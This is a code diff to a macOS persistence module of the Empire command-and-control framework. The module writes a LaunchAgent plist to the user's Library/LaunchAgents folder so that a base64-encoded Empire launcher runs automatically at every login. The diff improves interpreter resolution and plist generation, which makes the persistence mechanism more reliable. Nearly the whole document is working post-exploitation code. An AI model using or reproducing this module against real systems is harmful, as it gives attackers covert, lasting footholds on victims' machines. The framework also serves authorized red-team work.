@@ -1,3 +1,5 @@
+import base64
+
 from empire.server.common.empire import MainMenu
 from empire.server.core.module_models import EmpireModule
 
@@ -23,51 +25,45 @@ class Module:
         launcher = launcher.removesuffix(" | python3 &")
         launcher = launcher.strip('"')
 
-        plistSettings = f"""<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-<key>Label</key>
-<string>{plist_name}</string>
-<key>ProgramArguments</key>
-<array>
-<string>python</string>
-<string>-c</string>
-<string>{launcher}</string>
-</array>
-<key>RunAtLoad</key>
-<true/>
-</dict>
-</plist>
-"""
+        # launchd ignores files without the suffix; the Label is conventionally
+        # the file name without it.
+        label = plist_name.removesuffix(".plist")
+        plist_filename = f"{label}.plist"
+        launcher_b64 = base64.b64encode(launcher.encode()).decode()
 
+        # The interpreter is resolved on the agent and embedded as an absolute
+        # path, because launchd gives agents a minimal PATH. The interpreter
+        # running the agent is preferred; `shutil.which` (resolved against the
+        # agent's PATH at install time) is the fallback for an embedded
+        # interpreter, whose sys.executable is the host binary. plistlib
+        # escapes the launcher code, which a hand-written XML string did not.
         return f"""
-import subprocess
-import sys
 import base64
 import os
+import plistlib
+import shutil
+import sys
 
+def _is_python(path):
+    return os.path.isfile(path) and os.access(path, os.X_OK) and os.path.basename(path).lower().startswith('python')
 
-plistPath = "/Library/LaunchAgents/{plist_name}"
+interpreter = sys.executable if _is_python(sys.executable) else shutil.which('python3')
+if not interpreter:
+    print('[!] No python3 interpreter found; persistence not installed')
+    raise RuntimeError('no python3 interpreter found')
+launch_dir = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
+plist_path = os.path.join(launch_dir, {plist_filename!r})
+launcher = base64.b64decode("{launcher_b64}").decode()
 
-if not os.path.exists(os.path.split(plistPath)[0]):
-    os.makedirs(os.path.split(plistPath)[0])
+os.makedirs(launch_dir, exist_ok=True)
+plist = {{
+    'Label': {label!r},
+    'ProgramArguments': [interpreter, '-c', launcher],
+    'RunAtLoad': True,
+}}
+with open(plist_path, 'wb') as f:
+    plistlib.dump(plist, f)
+os.chmod(plist_path, 0o644)
 
-plist = \"\"\"
-{plistSettings}
-\"\"\"
-
-homedir = os.getenv("HOME")
-
-plistPath = homedir + plistPath
-
-e = open(plistPath,'wb')
-e.write(plist)
-e.close()
-
-os.chmod(plistPath, 0644)
-
-
-print("\\n[+] Persistence has been installed: /Library/LaunchAgents/{plist_name}")
-
+print("\\n[+] Persistence has been installed: " + plist_path + " (interpreter " + interpreter + ")")
 """
